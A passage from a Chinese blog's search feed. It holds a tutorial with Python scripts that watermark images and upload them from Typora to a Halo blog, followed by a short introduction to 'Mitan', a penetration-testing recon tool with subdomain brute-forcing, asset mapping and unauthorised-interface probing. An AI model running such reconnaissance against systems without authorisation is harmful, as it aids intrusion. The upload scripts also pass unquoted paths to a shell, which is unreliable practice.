class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">import datetime</span><br><span class="line">import os</span><br><span class="line">import requests</span><br><span class="line">import shutil</span><br><span class="line">import sys</span><br><span class="line">import urllib.parse</span><br><span class="line"></span><br><span class="line">TEMP_PATH = &quot;C:\\Users\\t1m2h0u\\AppData\\Local\\Temp\\Typora\\&quot;</span><br><span class="line"></span><br><span class="line">print(&quot;Upload Success:&quot;)</span><br><span class="line"></span><br><span class="line">for old_image_url in sys.argv[1:]:</span><br><span class="line">    old_image_urlparse = urllib.parse.urlparse(old_image_url)</span><br><span class="line">    new_image_name = f&quot;image-&#123;datetime.datetime.now().strftime(&quot;%Y%m%d%H%M%S%f&quot;)&#125;&quot;</span><br><span class="line">    new_image_suffix = os.path.splitext(old_image_urlparse.path)[-1]</span><br><span class="line">    new_image_url = f&quot;&#123;TEMP_PATH&#125;&#123;new_image_name&#125;&#123;new_image_suffix&#125;&quot;</span><br><span class="line">    if old_image_urlparse.scheme in [&quot;http&quot;, &quot;https&quot;]:</span><br><span class="line">        with open(new_image_url, &quot;wb&quot;) as image:</span><br><span class="line">            image.write(requests.get(old_image_url).content)</span><br><span class="line">    else:</span><br><span class="line">        shutil.copy(old_image_url, new_image_url)</span><br><span class="line">    print(os.popen(f&quot;hau upload -f &#123;new_image_url&#125;&quot;).readlines()[1].strip(&quot;\n&quot;))</span><br></pre></td></tr></table></figure><ul><li><strong>可以将这个python脚本放在这个目录</strong></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\BIGFISH\.config\@halo-dev\attachment-upload-cli\</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\BIGFISH\.config\@halo-dev\attachment-upload-cli\upload.py</span><br></pre></td></tr></table></figure><h3 id="（六）Typora执行python自定义命令"><a href="#（六）Typora执行python自定义命令" class="headerlink" title="（六）Typora执行python自定义命令"></a>（六）Typora执行python自定义命令</h3><ul><li><strong>添加命令：python.exe + python脚本路径</strong></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python.exe C:\Users\BIGFISH\.config\@halo-dev\attachment-upload-cli\upload.py</span><br></pre></td></tr></table></figure><p><img src="/../images/Typora%E4%B8%8A%E4%BC%A0%E5%9B%BE%E7%89%87%E8%87%B3Halo%E5%8D%9A%E5%AE%A2&&Python%E6%B7%BB%E5%8A%A0%E6%B0%B4%E5%8D%B0/image-20240827002939818501-20241107140625640.png" alt="image-20240827001041503"></p><ul><li><strong>执行命令情况，发现两个图片均上传成功，到此配置成功</strong></li></ul><p><img src="/../images/Typora%E4%B8%8A%E4%BC%A0%E5%9B%BE%E7%89%87%E8%87%B3Halo%E5%8D%9A%E5%AE%A2&&Python%E6%B7%BB%E5%8A%A0%E6%B0%B4%E5%8D%B0/image-20240827002940682471-20241107140625736.png" alt="image-20240827001127315"></p><h3 id="（七）使用方法"><a href="#（七）使用方法" class="headerlink" title="（七）使用方法"></a>（七）使用方法</h3><h4 id="1、单个图片上传"><a href="#1、单个图片上传" class="headerlink" title="1、单个图片上传"></a>1、单个图片上传</h4><ul><li><strong>可以点击图片，然后选择上传图片</strong></li></ul><p><img src="/../images/Typora%E4%B8%8A%E4%BC%A0%E5%9B%BE%E7%89%87%E8%87%B3Halo%E5%8D%9A%E5%AE%A2&&Python%E6%B7%BB%E5%8A%A0%E6%B0%B4%E5%8D%B0/image-20240827002941528769-20241107140626093.png" alt="image-20240827001503771"></p><h4 id="2、批量图片上传"><a href="#2、批量图片上传" class="headerlink" title="2、批量图片上传"></a>2、批量图片上传</h4><ul><li><strong>打开 Typora，进入 格式 -&gt; 图像 -&gt; 上传所以本地图片（因为不好截图，就没有截图）</strong></li></ul><p><img src="/../images/Typora%E4%B8%8A%E4%BC%A0%E5%9B%BE%E7%89%87%E8%87%B3Halo%E5%8D%9A%E5%AE%A2&&Python%E6%B7%BB%E5%8A%A0%E6%B0%B4%E5%8D%B0/image-20240827003010348198-20241107140626397.png" alt="image-20240827003006883"></p><h4 id="3、插入图片时自动上传"><a href="#3、插入图片时自动上传" class="headerlink" title="3、插入图片时自动上传"></a>3、插入图片时自动上传</h4><ul><li><strong>还是在偏好里设置，将插入图片时，改为 上传图片即可</strong></li></ul><p><img src="/../images/Typora%E4%B8%8A%E4%BC%A0%E5%9B%BE%E7%89%87%E8%87%B3Halo%E5%8D%9A%E5%AE%A2&&Python%E6%B7%BB%E5%8A%A0%E6%B0%B4%E5%8D%B0/image-20240827002942406575-20241107140626080.png" alt="image-20240827002051093"></p><h3 id="三、Python给图片添加水印"><a href="#三、Python给图片添加水印" class="headerlink" title="三、Python给图片添加水印"></a>三、Python给图片添加水印</h3><h4 id="1、安装包"><a href="#1、安装包" class="headerlink" title="1、安装包"></a>1、安装包</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install pillow</span><br></pre></td></tr></table></figure><h4 id="2、python代码"><a href="#2、python代码" class="headerlink" title="2、python代码"></a>2、python代码</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">from PIL import Image, ImageDraw, ImageFont</span><br><span class="line"></span><br><span class="line">def add_watermark(input_image_path, output_image_path, watermark_text):</span><br><span class="line">    # 打开原始图片</span><br><span class="line">    original = Image.open(input_image_path)</span><br><span class="line">    </span><br><span class="line">    # 创建一个绘图对象</span><br><span class="line">    draw = ImageDraw.Draw(original)</span><br><span class="line">    </span><br><span class="line">    # 使用你想要的字体和大小</span><br><span class="line">    font = ImageFont.truetype(&quot;arial.ttf&quot;, 36)</span><br><span class="line">    </span><br><span class="line">    # 获取图片的宽度和高度</span><br><span class="line">    width, height = original.size</span><br><span class="line">    </span><br><span class="line">    # 获取文本的边界框</span><br><span class="line">    text_bbox = draw.textbbox((0, 0), watermark_text, font=font)</span><br><span class="line">    text_width = text_bbox[2] - text_bbox[0]</span><br><span class="line">    text_height = text_bbox[3] - text_bbox[1]</span><br><span class="line">    </span><br><span class="line">    # 设置水印的位置（右下角）</span><br><span class="line">    x = width - text_width - 10  # 10个像素的边距</span><br><span class="line">    y = height - text_height - 10  # 10个像素的边距</span><br><span class="line">    </span><br><span class="line">    # 添加水印</span><br><span class="line">    draw.text((x, y), watermark_text, font=font, fill=(255, 255, 255, 128))  # 白色半透明水印</span><br><span class="line">    </span><br><span class="line">    # 保存带水印的图片</span><br><span class="line">    original.save(output_image_path)</span><br><span class="line"></span><br><span class="line"># 调用函数添加水印</span><br><span class="line">input_image_path = &quot;input_image.png&quot;</span><br><span class="line">output_image_path = &quot;output_image_with_watermark.png&quot;</span><br><span class="line">watermark_text = &quot;Big Fish Blog&quot;</span><br><span class="line"></span><br><span class="line">add_watermark(input_image_path, output_image_path, watermark_text)</span><br></pre></td></tr></table></figure><h4 id="3、运行结果"><a href="#3、运行结果" class="headerlink" title="3、运行结果"></a>3、运行结果</h4><p><img src="/../images/Typora%E4%B8%8A%E4%BC%A0%E5%9B%BE%E7%89%87%E8%87%B3Halo%E5%8D%9A%E5%AE%A2&&Python%E6%B7%BB%E5%8A%A0%E6%B0%B4%E5%8D%B0/image-20240827003042275697-20241107140626356.png" alt="back2"></p><h3 id="四、整体代码"><a href="#四、整体代码" class="headerlink" title="四、整体代码"></a>四、整体代码</h3><ul><li><strong>一下代码是 包括 上传 + 水印 的代码，按照二配置即可！</strong></li><li>windows版</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> shutil</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image, ImageDraw, ImageFont</span><br><span class="line"></span><br><span class="line">TEMP_PATH = <span class="string">&quot;C:\\Users\\BIGFISH\\AppData\\Local\\Temp\\Typora\\&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Upload Success:&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_watermark</span>(<span class="params">input_image_path, output_image_path</span>):</span><br><span class="line">    watermark_text = <span class="string">&quot;mbigfish.com&quot;</span></span><br><span class="line">    <span class="comment"># 打开原始图片</span></span><br><span class="line">    original = Image.<span class="built_in">open</span>(input_image_path)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 创建一个绘图对象</span></span><br><span class="line">    draw = ImageDraw.Draw(original)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 使用你想要的字体和大小</span></span><br><span class="line">    font = ImageFont.truetype(<span class="string">&quot;arial.ttf&quot;</span>, <span class="number">36</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 获取图片的宽度和高度</span></span><br><span class="line">    width, height = original.size</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 获取文本的边界框</span></span><br><span class="line">    text_bbox = draw.textbbox((<span class="number">0</span>, <span class="number">0</span>), watermark_text, font=font)</span><br><span class="line">    text_width = text_bbox[<span class="number">2</span>] - text_bbox[<span class="number">0</span>]</span><br><span class="line">    text_height = text_bbox[<span class="number">3</span>] - text_bbox[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 设置水印的位置（右下角）</span></span><br><span class="line">    x = width - text_width - <span class="number">10</span>  <span class="comment"># 10个像素的边距</span></span><br><span class="line">    y = height - text_height - <span class="number">10</span>  <span class="comment"># 10个像素的边距</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 添加水印</span></span><br><span class="line">    draw.text((x, y), watermark_text, font=font, fill=(<span class="number">238</span>, <span class="number">130</span>, <span class="number">238</span>, <span class="number">120</span>))  <span class="comment"># 粉色半透明水印</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 保存带水印的图片</span></span><br><span class="line">    original.save(output_image_path)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> old_image_url <span class="keyword">in</span> sys.argv[<span class="number">1</span>:]:</span><br><span class="line">    old_image_urlparse = urllib.parse.urlparse(old_image_url)</span><br><span class="line">    time_name = datetime.datetime.now().strftime(<span class="string">&#x27;%Y%m%d%H%M%S%f&#x27;</span>)</span><br><span class="line">    new_image_name = <span class="string">f&quot;image-<span class="subst">&#123;time_name&#125;</span>&quot;</span></span><br><span class="line">    new_image_suffix = os.path.splitext(old_image_urlparse.path)[-<span class="number">1</span>]</span><br><span class="line">    new_image_url = <span class="string">f&quot;<span class="subst">&#123;TEMP_PATH&#125;</span><span class="subst">&#123;new_image_name&#125;</span><span class="subst">&#123;new_image_suffix&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line">    watermark_image_url = <span class="string">f&quot;watermark-<span class="subst">&#123;time_name&#125;</span><span class="subst">&#123;new_image_suffix&#125;</span>&quot;</span></span><br><span class="line">    add_watermark(old_image_url, watermark_image_url)</span><br><span class="line">    <span class="keyword">if</span> old_image_urlparse.scheme <span class="keyword">in</span> [<span class="string">&quot;http&quot;</span>, <span class="string">&quot;https&quot;</span>]:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(new_image_url, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> image:</span><br><span class="line">            image.write(requests.get(watermark_image_url).content)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        shutil.copy(watermark_image_url, new_image_url)</span><br><span class="line">    os.remove(watermark_image_url)</span><br><span class="line">    <span class="built_in">print</span>(os.popen(<span class="string">f&quot;hau upload -f <span class="subst">&#123;new_image_url&#125;</span>&quot;</span>).readlines()[<span class="number">1</span>].strip(<span class="string">&quot;\n&quot;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># &quot;C:\\Users\\BIGFISH\\AppData\\Local\\Temp\\Typora\\typora-icon2.png&quot; </span></span><br><span class="line"><span class="comment"># &quot;C:\\Users\\BIGFISH\\AppData\\Local\\Temp\\Typora\\typora-icon.png&quot;</span></span><br></pre></td></tr></table></figure><ul><li>mac版</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line">import datetime</span><br><span class="line">import os</span><br><span class="line">import requests</span><br><span class="line">import shutil</span><br><span class="line">import sys</span><br><span class="line">import urllib.parse</span><br><span class="line">from PIL import Image, ImageDraw, ImageFont</span><br><span class="line"></span><br><span class="line">TEMP_PATH = &#x27;/tmp/&#x27;</span><br><span class="line"></span><br><span class="line">print(&quot;Upload Success:&quot;)</span><br><span class="line"></span><br><span class="line">def add_watermark(input_image_path, output_image_path):</span><br><span class="line">    watermark_image_path = &#x27;/Users/mawu/.config/@halo-dev/attachment-upload-cli/log.png&#x27;</span><br><span class="line">    # 打开原始图片和水印图片</span><br><span class="line">    original = Image.open(input_image_path)</span><br><span class="line">    watermark = Image.open(watermark_image_path)</span><br><span class="line">    # 获取原始图片的尺寸</span><br><span class="line">    original_width, original_height = original.size</span><br><span class="line">    # 水印图片尺寸</span><br><span class="line">    watermark_width = int(150)</span><br><span class="line">    watermark_height = int((watermark.size[1] / watermark.size[0]) * watermark_width)</span><br><span class="line">    watermark = watermark.resize((watermark_width, watermark_height), Image.LANCZOS)</span><br><span class="line">    # 计算水印图片在右下角的位置</span><br><span class="line">    position = (original_width - watermark_width - 10, original_height - watermark_height - 10)  # 10个像素的边距</span><br><span class="line"></span><br><span class="line">    # 将水印图片粘贴到原始图片的右下角</span><br><span class="line">    original.paste(watermark, position, watermark)</span><br><span class="line"></span><br><span class="line">    # 保存带有水印的图片</span><br><span class="line">    original.save(output_image_path)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 上传图片失败。错误信息:</span><br><span class="line"># Upload Success: /Users/mawu/Documents/typora/其他/cqupt_net.assets/image-20241026125345741.png</span><br><span class="line"># 遍历命令行参数中的图片 URL 列表（从 sys.argv[1] 开始）</span><br><span class="line"></span><br><span class="line">for old_image_url in sys.argv[1:]:</span><br><span class="line">    # 解析图片的 URL，获取 URL 的各个部分</span><br><span class="line">    old_image_urlparse = urllib.parse.urlparse(old_image_url)</span><br><span class="line">    # 生成时间戳，确保文件名唯一</span><br><span class="line">    time_name = datetime.datetime.now().strftime(&#x27;%Y%m%d%H%M%S%f&#x27;)</span><br><span class="line">    # 设置新的图片名称，格式为 &quot;image-&lt;时间戳&gt;&quot;</span><br><span class="line">    new_image_name = f&quot;image-&#123;time_name&#125;&quot;</span><br><span class="line">    # 获取图片的扩展名（例如 .jpg, .png）</span><br><span class="line">    new_image_suffix = os.path.splitext(old_image_urlparse.path)[-1]</span><br><span class="line"></span><br><span class="line">    # 生成新的图片路径，用于保存处理后的图片</span><br><span class="line">    new_image_url = f&quot;&#123;TEMP_PATH&#125;&#123;new_image_name&#125;&#123;new_image_suffix&#125;&quot;</span><br><span class="line"></span><br><span class="line">    # 生成水印图片的文件路径，命名为 &quot;watermark-&lt;时间戳&gt;&lt;扩展名&gt;&quot;</span><br><span class="line">    # watermark_image_url = f&quot;watermark-&#123;time_name&#125;&#123;new_image_suffix&#125;&quot;</span><br><span class="line"></span><br><span class="line">    # 调用 add_watermark 函数对图片添加水印</span><br><span class="line">    add_watermark(old_image_url, new_image_url)</span><br><span class="line"></span><br><span class="line">    # 判断图片是远程 URL 还是本地文件路径</span><br><span class="line">    # if old_image_urlparse.scheme in [&quot;http&quot;, &quot;https&quot;]:</span><br><span class="line">    #     # 如果是远程 URL，通过 requests 下载带水印的图片</span><br><span class="line">    #     with open(new_image_url, &quot;wb&quot;) as image:</span><br><span class="line">    #         # 获取水印图片的内容并写入新图片路径</span><br><span class="line">    #         image.write(requests.get(watermark_image_url).content)</span><br><span class="line">    # else:</span><br><span class="line">    #     # 如果是本地文件路径，直接复制水印图片到新图片路径</span><br><span class="line">    #     shutil.copy(watermark_image_url, new_image_url)</span><br><span class="line"></span><br><span class="line">    # 上传处理后的图片，并获取上传后的返回信息</span><br><span class="line">    upload_output = os.popen(f&quot;hau upload -f &#123;new_image_url&#125;&quot;).readlines()</span><br><span class="line">    # 删除临时的新图片</span><br><span class="line">    os.remove(new_image_url)</span><br><span class="line">    # 打印上传结果的第二行信息（假设是上传后的 URL 或信息）</span><br><span class="line">    print(upload_output[1].strip(&quot;\n&quot;))</span><br></pre></td></tr></table></figure><h3 id="五、注意"><a href="#五、注意" class="headerlink" title="五、注意"></a>五、注意</h3><ul><li><strong>如果报错，一定要记得本地python环境安装好上述用到的pip包</strong></li></ul>]]></content>
      
      
      <categories>
          
          <category> 问题解决 </category>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 原创 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>密探渗透测试工具</title>
      <link href="//archives/1724651092426/"/>
      <url>//archives/1724651092426/</url>
      
        <content type="html"><![CDATA[<h1 id="密探-–-渗透测试工具"><a href="#密探-–-渗透测试工具" class="headerlink" title="密探 – 渗透测试工具"></a>密探 – 渗透测试工具</h1><h2 id="一、功能特性"><a href="#一、功能特性" class="headerlink" title="一、功能特性"></a>一、功能特性</h2><p><strong>密探-主要包含</strong></p><ul><li><strong>资产信息收集，</strong></li><li><strong>IP端口查询</strong></li><li><strong>备案信息查询</strong></li><li><strong>子域名爆破（支持多级递归）</strong></li><li><strong>搜索引擎语法自动生成（FOFA,Hunter,Quake,ZoomEye,google,github</strong></li><li><strong>资产测绘（FOFA，hunter，Quake，ZoomEye 的查询及结果导出）</strong></li><li><strong>指纹识别</strong></li><li><strong>敏感信息（暴露接口并可以自动探测未授权）</strong></li><li><strong>文件扫描（包含目录，备份文件，spring信息泄漏，自定义字典等）</strong></li><li><strong>渗透技能路线备忘录</strong></li><li><strong>常用网络安全网站导航等功能</strong></li></ul><h2 id="二、支持系统"><a href="#二、支持系统" class="headerlink" title="二、支持系统"></a>二、支持系统</h2><p><strong>支持Windows、Mac、Linux</strong></p><h2 id="三、运行方法"><a href="#三、运行方法" class="headerlink" title="三、运行方法"></a>三、运行方法</h2><ol><li><strong>在jdk8环境下（在jdk8以上的高版本请参考常见问题1的处理方案）运行以下语句运行:</strong></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar mitan-jar-with-dependencies.jar</span><br></pre></td></tr></table></figure><ol start="2"><li><strong>Mac&#x2F;Linux启动脚本</strong></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># Mac/Linux 环境下，可以通过sh文件启动，需要在控制台窗口先给予**start.sh**权限。</span><br><span class="line">chmod +x start.sh</span><br><span class="line"></span><br><span class="line"># 赋予权限后，每次在控制台窗口执行如下命令打开工具</span><br><span class="line">./start.sh</span><br></pre></td></tr></table></figure><ol start="3"><li><strong>Windows启动脚本</strong></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">双击&quot;start.bat&quot; </span><br></pre></td></tr></table></figure><h2 id="四、工具截图"><a href="#四、工具截图" class="headerlink" title="四、工具截图"></a>四、工具截图</h2><p><img src="/../images/%E5%AF%86%E6%8E%A2%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7/image-20240826133840430972-0960132.png" alt="image-20240826133836201"></p><p><img src="/../images/%E5%AF%86%E6%8E%A2%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7/image-20240826133933671932.png" alt="image-20240826133929123"></p><h2 id="五、下载地址"><a href="#五、下载地址" class="headerlink" title="五、下载地址"></a>五、下载地址</h2><p><strong>GitHub：</strong><a href="https://github.com/kkbo8005/mitan">https://github.com/kkbo8005/mitan</a></p>]]></content>
      
      
      <categories>
          
          <category> 工具使用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 原创 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
